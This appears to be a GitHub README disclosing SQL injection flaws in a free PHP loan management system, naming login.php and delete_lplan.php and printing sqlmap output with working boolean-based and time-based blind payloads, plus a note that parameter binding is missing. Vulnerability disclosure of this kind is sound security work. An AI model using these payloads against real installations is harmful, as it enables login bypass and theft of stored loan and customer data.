# Loan-Management-System-Sqlinjection

## Sqlinjection 1

### Sqlinjection Page
login.php   
![image](https://user-images.githubusercontent.com/72059221/182859043-d319c3d5-1d29-41f4-9d33-ee76d5ca7d8b.png)

### Sqlmap
![image](https://user-images.githubusercontent.com/72059221/182859212-e9fbe12d-339c-47b3-b05e-712dbaa4dd5b.png)

```
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=1' OR NOT 8877=8877#&password=1&login=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 4254 FROM (SELECT(SLEEP(5)))Ydjq)-- NMhF&password=1&login=1
---
[21:25:18] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.39, PHP 5.6.9
back-end DBMS: MySQL >= 5.0.12
```

### Code
The bind_param binding parameter is not used    

![image](https://user-images.githubusercontent.com/72059221/182859564-ad69e86c-e424-49c4-a140-a670b2e2b3ba.png)

![image](https://user-images.githubusercontent.com/72059221/182859645-a11bbbae-8fd6-44aa-90b7-78dfa285ff1f.png)

## Sqlinjection 2 ( too many )

### Sqlinjection Page
delete_lplan.php     

### Sqlmap
![image](https://user-images.githubusercontent.com/72059221/182864525-22cec33e-b117-4c8b-9ad0-31ab1eecf3b7.png)


``` 
GET parameter 'lplan_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 1899 HTTP(s) requests:
---
Parameter: lplan_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: lplan_id=2'+(SELECT 0x714c6c4c WHERE 6948=6948 AND (SELECT 7588 FROM (SELECT(SLEEP(5)))BFGS))+'
---
[21:51:10] [INFO] the back-end DBMS is MySQL
[21:51:10] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[21:51:10] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
web application technology: PHP 5.6.9, Apache 2.4.39
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
``` 
### Code
![image](https://user-images.githubusercontent.com/72059221/182864611-a915c912-0a27-4b1a-b609-ab8893d43661.png)

![image](https://user-images.githubusercontent.com/72059221/182864674-80ed2a5d-8a94-483f-9742-ad0f4d89afc5.png)

### A lot of
![image](https://user-images.githubusercontent.com/72059221/182866706-0e9adab3-fb40-4a75-97cf-45791b1451b8.png)
![image](https://user-images.githubusercontent.com/72059221/182866759-0062d5d2-414f-4c71-ae2e-6824eeeee8a8.png)
![image](https://user-images.githubusercontent.com/72059221/182866799-c0fc0dba-33d5-4e66-8fb6-9a01e59d6995.png)
![image](https://user-images.githubusercontent.com/72059221/182866847-13c0bb07-7487-4b78-a67d-6515195281a9.png)
![image](https://user-images.githubusercontent.com/72059221/182866900-eb29354f-53cb-4dbd-91c4-2621c59831e7.png)


## Code Downalod
https://www.sourcecodester.com/php/15529/loan-management-system-oop-php-mysqlijquery-free-source-code.html
